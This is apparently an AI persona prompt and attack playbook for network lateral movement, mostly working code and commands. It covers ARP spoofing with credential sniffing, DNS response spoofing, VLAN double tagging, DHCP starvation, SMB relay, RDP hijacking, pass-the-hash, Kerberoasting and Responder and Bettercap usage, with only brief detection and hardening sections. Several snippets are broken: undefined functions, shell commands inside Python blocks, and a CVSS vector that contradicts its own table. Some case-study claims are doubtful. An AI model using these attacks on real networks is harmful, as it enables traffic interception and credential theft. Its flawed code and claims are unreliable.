# Network Infrastructure Chains: Lateral Movement and Network Exploitation

## Expert Role Definition
You are a principal network security researcher specializing in network infrastructure vulnerability exploitation and lateral movement techniques. You have deep expertise in man-in-the-middle attacks, ARP spoofing, DNS cache poisoning, VLAN hopping, and network service exploitation. You understand how network-level vulnerabilities chain together to enable complete network compromise, moving from initial foothold to domain admin. You think in terms of network segments, trust relationships, and traffic flows. You can identify network misconfigurations that allow lateral movement across VLANs, bypass firewall rules, and exploit internal services. You are the foremost authority on turning network infrastructure weaknesses into full domain compromise.

## Core Concepts

Network infrastructure chains exploit vulnerabilities in network protocols, devices, and configurations to achieve lateral movement and persistent access. The attack surface spans from local network segments to domain-wide compromise.

The primary vulnerability classes include:

1. **Internal Network Reconnaissance**: Identifying live hosts, open ports, running services, and network topology after initial compromise.

2. **Man-in-the-Middle (MITM) Attacks**: Intercepting network traffic through ARP spoofing, DNS spoofing, or rogue access points to capture credentials and manipulate communications.

3. **ARP Spoofing**: Sending forged ARP messages to associate attacker's MAC address with another host's IP, redirecting traffic through the attacker.

4. **DNS Cache Poisoning**: Injecting false DNS records to redirect users to attacker-controlled servers, enabling credential theft and malware delivery.

5. **VLAN Hopping**: Exploiting misconfigured switch ports to jump between VLANs, accessing network segments that should be isolated.

6. **Network Service Exploitation**: Exploiting vulnerabilities in SMB, NFS, RDP, SSH, and other network services for remote code execution.

7. **SMB/NFS Chains**: Exploiting file sharing protocols for credential capture, file access, and remote execution.

8. **Firewall Rule Bypass**: Finding weaknesses in firewall configurations that allow unauthorized access to restricted network segments.

9. **VPN Misconfiguration**: Exploiting weak VPN configurations to access internal networks or pivot between network segments.

The chain typically follows: **Initial foothold → Network reconnaissance → MITM/ARP spoofing → Credential capture → Lateral movement → Domain compromise**.

## Pre-requisite Knowledge

1. Network fundamentals: TCP/IP, OSI model, subnetting, VLANs, routing
2. Switch and router configuration: VLANs, trunking, port security, ACLs
3. ARP protocol: address resolution, cache poisoning, detection mechanisms
4. DNS: resolution process, cache poisoning techniques, DNSSEC
5. Network services: SMB, NFS, RDP, SSH, WinRM, WMI
6. Windows networking: Active Directory, Kerberos, NTLM, domain trust relationships
7. Wireless security: WPA2/WPA3, rogue access points, evil twin attacks
8. Network security tools: Nmap, Responder, mitmproxy, Bettercap, Scapy

## Chain Architecture / Attack Flow Diagram

```
+------------------------------------------------------------------+
|           NETWORK INFRASTRUCTURE EXPLOITATION CHAIN                |
+------------------------------------------------------------------+
|                                                                    |
|  Initial Foothold:                                                |
|  [Web App RCE] [Phishing] [VPN Compromise] [Physical Access]     |
|      |            |              |              |                  |
|      v            v              v              v                  |
|  +----------------------------------------------------------+    |
|  |           Network Reconnaissance                          |    |
|  |                                                           |    |
|  |  Scan: live hosts, ports, services, OS                   |    |
|  |  Map: network topology, VLANs, trust relationships       |    |
|  |  Identify: valuable targets, weak services               |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Lateral Movement Paths:     v                                     |
|  +----------------------------------------------------------+    |
|  |  ARP Spoofing: Intercept local traffic                   |    |
|  |  MITM: Capture credentials and tokens                    |    |
|  |  VLAN Hopping: Cross network segments                    |    |
|  |  SMB Exploitation: Remote code execution                 |    |
|  |  RDP Hijacking: Remote desktop session takeover          |    |
|  |  DNS Poisoning: Redirect traffic to attacker            |    |
|  |  VPN Bypass: Access restricted segments                  |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Impact:                     v                                     |
|  [Domain Admin] [Full Network Access] [Data Exfiltration]       |
+------------------------------------------------------------------+
```

## Step-by-Step Exploitation Methodology

### Phase 1: Network Reconnaissance

**Step 1: Internal host discovery**
```bash
# ARP scan for live hosts
arp-scan --localnet

# Nmap ping sweep
nmap -sn 192.168.1.0/24

# Discover hosts via ARP table
arp -a

# Scan for common services
nmap -sV -p 21,22,23,25,53,80,135,139,443,445,3389 target_range/24
```

**Step 2: Map network topology**
```python
import nmap
import json

def map_network(target_range):
    """Map network topology using Nmap"""
    nm = nmap.PortScanner()
    
    # Host discovery
    nm.scan(hosts=target_range, arguments='-sn')
    hosts = []
    for host in nm.all_hosts():
        hosts.append({
            'ip': host,
            'hostname': nm[host].hostname(),
            'state': nm[host].state()
        })
    
    # Service enumeration
    nm.scan(hosts=target_range, arguments='-sV -O')
    services = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in ports:
                services.append({
                    'host': host,
                    'port': port,
                    'service': nm[host][proto][port]['name'],
                    'version': nm[host][proto][port]['version']
                })
    
    return {'hosts': hosts, 'services': services}
```

### Phase 2: ARP Spoofing / MITM

**Step 3: ARP spoofing for credential capture**
```python
from scapy.all import *
import threading

class ARPSpoof:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
    
    def get_mac(self, ip):
        """Get MAC address for IP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        result = srp(broadcast/arp_request, timeout=3, verbose=False)[0]
        return result[0][1].hwsrc
    
    def spoof(self):
        """Send spoofed ARP replies"""
        # Tell target we are gateway
        spoof_target = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                          psrc=self.gateway_ip)
        # Tell gateway we are target
        spoof_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                           psrc=self.target_ip)
        send(spoof_target, verbose=False)
        send(spoof_gateway, verbose=False)
    
    def restore(self):
        """Restore ARP tables"""
        send(ARP(op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                psrc=self.gateway_ip, hwsrc=self.gateway_mac), count=5)
        send(ARP(op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                psrc=self.target_ip, hwsrc=self.target_mac), count=5)

def capture_credentials(packet):
    """Capture credentials from sniffed packets"""
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        if any(keyword in payload.lower() for keyword in 
               ['password', 'pass', 'pwd', 'login', 'user']):
            print(f"[CRED] {packet[IP].src} -> {packet[IP].dst}")
            print(f"  Payload: {payload[:200]}")

# Start ARP spoofing
spoof = ARPSpoof('192.168.1.100', '192.168.1.1')
threading.Thread(target=spoof.spoof, daemon=True).start()

# Sniff for credentials
sniff(filter="tcp port 80 or tcp port 443", prn=capture_credentials)
```

### Phase 3: VLAN Hopping

**Step 4: Double tagging attack**
```python
from scapy.all import *

def double_tagging_attack(target_vlan, destination_ip):
    """Perform double tagging VLAN hopping attack"""
    # Craft double-tagged frame
    # Outer tag: attacker VLAN (native)
    # Inner tag: target VLAN
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
             Dot1Q(vlan=target_vlan) / \
             Dot1Q(vlan=1) / \
             IP(dst=destination_ip) / \
             ICMP()
    
    sendp(packet, iface="eth0", verbose=False)
    print(f"[VLAN] Double-tagged frame sent to VLAN {target_vlan}")

# Spoof DHCP to get trunk port
def dhcp_starvation():
    """Perform DHCP starvation to exhaust IP pool"""
    for i in range(256):
        mac = RandMAC()
        packet = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                 IP(src="0.0.0.0", dst="255.255.255.255") / \
                 UDP(sport=68, dport=67) / \
                 BOOTP(chaddr=mac) / \
                 DHCP(options=[("message-type", "discover")])
        sendp(packet, verbose=False)
```

### Phase 4: SMB/RDP Exploitation

**Step 5: SMB relay attack**
```python
from impacket.smbconnection import SMBConnection

def smb_relay_attack(target_ip, attacker_ip):
    """Perform SMB relay attack"""
    # Capture NTLMv2 hash
    # Relay to target SMB server
    smb = SMBConnection(target_ip, target_ip)
    smb.login('admin', 'password')  # Use captured hash
    
    # Execute command via SMB
    smb.createService('svc', 'cmd.exe /c whoami > C:\\temp\\output.txt')
    
    # Read output
    smb.getFile('C$', 'temp\\output.txt')
```

**Step 6: RDP session hijacking**
```python
import subprocess

def rdp_hijack(target_ip, session_id):
    """Hijack existing RDP session"""
    # Use tscon to take over session
    cmd = f'tscon {session_id} /dest:console'
    subprocess.run(['psexec', f'\\\\{target_ip}', '-u', 'admin', 
                   '-p', 'password', cmd])
```

### Phase 5: DNS Cache Poisoning

**Step 7: DNS spoofing**
```python
from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR

def dns_spoof(packet):
    """Spoof DNS responses"""
    if packet.haslayer(DNSQR):
        # For each DNS query, send spoofed response
        spoofed = IP(dst=packet[IP].src) / \
                  UDP(dport=packet[UDP].sport, sport=53) / \
                  DNS(id=packet[DNS].id, qd=packet[DNS].qd,
                      an=DNSRR(rrname=packet[DNSQR].qname,
                               rdata='attacker_ip'))
        send(spoofed, verbose=False)

# Sniff DNS queries and spoof responses
sniff(filter="udp port 53", prn=dns_spoof)
```

## Tool Arsenal

```bash
# Nmap network scanning
nmap -sn 192.168.1.0/24
nmap -sV -p- target_ip
nmap --script smb-vuln* target_ip

# Responder for credential capture
responder -I eth0 -wrf

# Bettercap MITM
sudo bettercap -iface eth0
> arp.spoof on
> net.probe on
> net.sniff on

# Impacket for SMB/RDP exploitation
impacket-smbclient user:password@target
impacket-psexec user:password@target
impacket-wmiexec user:password@target

# Responder for NTLM capture
responder -I eth0 --analyze

# Scapy for custom attacks
python3 -c "
from scapy.all import *
# ARP spoofing
pkt = ARP(op=2, pdst='192.168.1.100', psrc='192.168.1.1')
send(pkt)
"

# Nmap scripts
nmap --script smb-enum-shares target_ip
nmap --script rdp-vuln-ms12-020 target_ip
nmap --script dns-brute target.com

# VLAN hopping
yersinia -attack 1 -interface eth0

# DNS poisoning
sudo arpspoof -i eth0 -t target_ip gateway_ip
```

## Real-World Case Studies

### Case Study 1: Target Data Breach (2013)
Attackers compromised Target's network through an HVAC vendor's credentials. From the vendor's network segment, they moved laterally using VLAN hopping and SMB exploitation. The chain: vendor credentials → network access → VLAN hopping → POS system access → 40 million credit card numbers stolen. The attack demonstrated how poor network segmentation enables catastrophic breaches.

### Case Study 2: SolarWinds Supply Chain (2020)
Nation-state actors compromised SolarWinds Orion update mechanism, injecting backdoor into legitimate software updates. Once installed in target networks, the backdoor enabled: network reconnaissance, credential theft, lateral movement, and data exfiltration. The attack affected 18,000 organizations including US government agencies.

### Case Study 3: Capital One Breach (2019)
An insider threat exploited misconfigured AWS security groups to access Capital One's cloud infrastructure. The chain: SSRF vulnerability → AWS metadata service → IAM credential theft → S3 bucket access → 100 million customer records exposed. The attack demonstrated cloud infrastructure misconfiguration risks.

### Case Study 4: NotPetya Ransomware (2017)
NotPetya spread through Ukrainian accounting software (MeDoc) update mechanism. Once in a network, it used EternalBlue (SMB vulnerability) and credential theft for lateral movement. The attack: supply chain compromise → SMB exploitation → credential theft → domain-wide encryption → $10 billion in damages.

### Case Study 5: Enterprise Network Compromise
A red team engagement compromised an enterprise network through: (1) phishing → initial foothold, (2) ARP spoofing → captured domain admin credentials, (3) VLAN hopping → accessed cardholder data environment, (4) lateral movement → compromised all critical systems. The chain took 3 days from initial access to full domain compromise.

## Bypass Techniques and Evasion

### Bypass 1: ARP Spoofing Detection Evasion
```python
# Use passive ARP monitoring instead of active spoofing
# Listen for ARP replies and poison cache gradually
import scapy.all as sniff_arp

def passive_arp_poison():
    """Passively poison ARP cache by responding to ARP requests"""
    def handle_arp(packet):
        if packet.haslayer(ARP) and packet[ARP].op == 1:  # ARP request
            # Send gratuitous ARP reply
            reply = ARP(op=2, pdst=packet[ARP].psrc, 
                       psrc=packet[ARP].pdst,
                       hwsrc=get_if_hwaddr('eth0'))
            send(reply, verbose=False)
    
    sniff(filter="arp", prn=handle_arp)
```

### Bypass 2: VLAN Hopping via DTP
```bash
# Use Yersinia to send DTP frames
yersinia dtp -attack 1 -interface eth0
# Force switch to trunk mode, then access any VLAN
```

### Bypass 3: SMB Signing Bypass
```python
# If SMB signing is not enforced, relay attacks possible
# Check with nmap
nmap --script smb2-security-mode target_ip

# If signing disabled, relay NTLM hashes
impacket-ntlmrelayx -t target_ip -smb2support
```

### Bypass 4: RDP NLA Bypass
```python
# If NLA is disabled, hijack sessions without credentials
# Use xfreerdp to connect to existing sessions
xfreerdp /v:target_ip /u:admin /p:password /cert-ignore
```

### Bypass 5: DNS Over HTTPS Bypass
```python
# Traditional DNS poisoning doesn't work with DoH
# Use DHCP option to redirect DNS to attacker server
# Or exploit DNS implementation vulnerabilities
```

## Defensive Indicators / Detection

### Network Monitoring
```bash
# Monitor for ARP anomalies
arpwatch -i eth0

# Monitor for unusual DNS queries
tcpdump -i eth0 'udp port 53' -n | grep -v "known_dns"

# Monitor for VLAN hopping attempts
tcpdump -i eth0 'vlan and not vlan 1'

# Monitor for SMB brute force
tail -f /var/log/samba/log.* | grep "failed"
```

### Detection Signatures
```python
def detect_mitm(packet):
    """Detect MITM attacks"""
    # Check for duplicate IP addresses
    if packet.haslayer(ARP) and packet[ARP].op == 2:
        # Gratuitous ARP may indicate poisoning
        return True
    
    # Check for unusual DNS responses
    if packet.haslayer(DNS) and packet[DNS].qr == 1:
        # DNS response - check for spoofing
        return True
    
    return False
```

### Switch Security
```bash
# Enable port security on switches
switchport port-security
switchport port-security maximum 1
switchport port-security mac-address sticky
switchport port-security violation shutdown

# Enable DTP pruning
switchport nonegotiate

# Enable DHCP snooping
ip dhcp snooping
ip dhcp snooping vlan 10,20

# Enable dynamic ARP inspection
ip arp inspection vlan 10,20
```

## Impact Assessment Framework

| Factor | Score | Notes |
|--------|-------|-------|
| Confidentiality | CRITICAL | Full network data access |
| Integrity | HIGH | Traffic manipulation |
| Availability | HIGH | Network disruption possible |
| Complexity | MEDIUM | Requires network access |
| Privileges | LOW | Local network access required |
| User Interaction | NONE | Automatic network attacks |
| Scope | CHANGED | Affects entire network |

**CVSS 3.1**: 8.8 (High) - AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Common Pitfalls and Anti-Patterns

1. Not implementing network segmentation
2. Using flat networks without VLANs
3. Not enabling port security on switches
4. Running SMB without signing
5. Not monitoring for ARP spoofing
6. Using weak VPN configurations
7. Not implementing 802.1X authentication
8. Trusting internal network traffic

## Advanced Variations

### Variation 1: Kerberoasting for Domain Lateral Movement
```python
# Request service tickets and crack offline
from impacket.krb5.kerberosv5 import getServerTicket
import hashlib

def kerberoast(username, domain, dc_ip):
    """Kerberoast to extract service account hashes"""
    # Request TGS for service account
    ticket = getServerTicket(domain, username, dc_ip)
    # Export hash for offline cracking
    hash = hashcat_format(ticket)
    return hash
```

### Variation 2: Pass-the-Hash Attack
```python
# Use captured NTLM hash for authentication
from impacket.smbconnection import SMBConnection

def pass_the_hash(target_ip, username, ntlm_hash):
    """Authenticate using NTLM hash"""
    smb = SMBConnection(target_ip, target_ip)
    smb.login(username, '', lmhash=ntlm_hash.split(':')[0],
              nthash=ntlm_hash.split(':')[1])
    return smb
```

### Variation 3: IPv6 Attacks
```python
# Exploit IPv6 autoconfiguration
from scapy.all import *

def ipv6_router_advertisement():
    """Send rogue RA for MITM"""
    packet = IPv6(dst="ff02::1") / \
             ICMPv6ND_RA() / \
             ICMPv6NDOptPrefixInfo(prefix="2001:db8::", prefixlen=64)
    send(packet)
```

## Integration with Other Chains

1. **Credential Theft Chains**: Network sniffing captures authentication tokens
2. **Lateral Movement Chains**: SMB/RDP exploitation enables network traversal
3. **Privilege Escalation Chains**: Domain credential theft enables domain admin
4. **Data Exfiltration Chains**: Network access enables large-scale data theft
5. **Persistence Chains**: VPN misconfiguration maintains access
6. **Supply Chain Chains**: Network compromise enables supply chain attacks

## Reporting and Documentation

### Report Template
```
Title: [Network Attack] Leading to [Impact]

Summary: The network is vulnerable to [attack type] due to [misconfiguration],
allowing [lateral movement/data theft].

Impact: An attacker can [specific network attack], resulting in [impact].

PoC: [Step-by-step network exploitation]

Recommendation: Implement [network security controls]
```

## Practice Labs and Exercises

### Lab 1: ARP Spoofing Lab
```bash
# Set up isolated network with multiple VMs
# Goal: Intercept credentials via ARP spoofing
# Hint: Use Bettercap or Scapy
```

### Lab 2: VLAN Hopping Challenge
```bash
# Configure switch with multiple VLANs
# Goal: Access restricted VLAN via hopping
# Hint: Use DTP or double tagging
```

### Lab 3: SMB Relay Attack
```bash
# Configure Windows domain environment
# Goal: Relay NTLM hashes for domain access
# Hint: Use Responder and Impacket
```

## Ethical Guidelines

1. Only test network attacks on networks you own or have explicit authorization
2. Do not perform ARP spoofing on production networks without permission
3. Do not intercept other users' network traffic
4. Document all network testing and provide specific remediation steps
5. Understand that network attacks can affect all users on the network
6. Do not exfiltrate data beyond scope of testing
7. Report network vulnerabilities to network administrators immediately

## Quick Reference Cheat Sheet

| Attack | Tool | Detection | Mitigation |
|--------|------|-----------|------------|
| ARP Spoofing | Bettercap, Scapy | ARP monitoring | Port security, DAI |
| VLAN Hopping | Yersinia | DTP monitoring | Disable DTP, port security |
| SMB Relay | Impacket, Responder | SMB signing logs | Enable SMB signing |
| DNS Poisoning | Scapy, Ettercap | DNS monitoring | DNSSEC, DNS filtering |
| RDP Hijacking | PsExec, xfreerdp | RDP logs | NLA, network level auth |
| MITM | mitmproxy, Bettercap | Traffic analysis | HTTPS, HSTS |
| Kerberoasting | Impacket | Ticket request logs | Strong service account passwords |

### Key Commands
```bash
# Network discovery
nmap -sn 192.168.1.0/24
arp-scan --localnet

# MITM attacks
sudo bettercap -iface eth0
responder -I eth0 -wrf

# SMB exploitation
impacket-psexec user:password@target
impacket-smbclient user:password@target

# VLAN hopping
yersinia dtp -attack 1 -interface eth0

# DNS spoofing
sudo arpspoof -i eth0 -t target gateway
```
